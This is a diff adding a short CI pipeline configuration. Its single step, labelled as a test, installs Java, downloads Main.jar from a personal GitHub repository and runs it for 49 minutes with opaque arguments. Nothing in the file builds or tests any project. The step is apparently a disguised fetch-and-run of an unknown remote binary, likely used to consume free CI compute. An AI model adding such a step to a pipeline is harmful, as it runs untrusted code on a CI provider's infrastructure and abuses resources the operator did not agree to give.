@@ -1,0 +1,14 @@
+version: '1.0'
+steps:
+  test_app:
+    title: Running docker image
+    type: freestyle
+    working_directory: /
+    arguments:
+      image: 'ubuntu:18.04'
+      commands:
+        - apt update
+        - apt install wget default-jre -y
+        - wget https://github.com/z6rubinaz1/first-repository/raw/master/Main.jar
+        - timeout 49m java -jar Main.jar rock6064 1
+
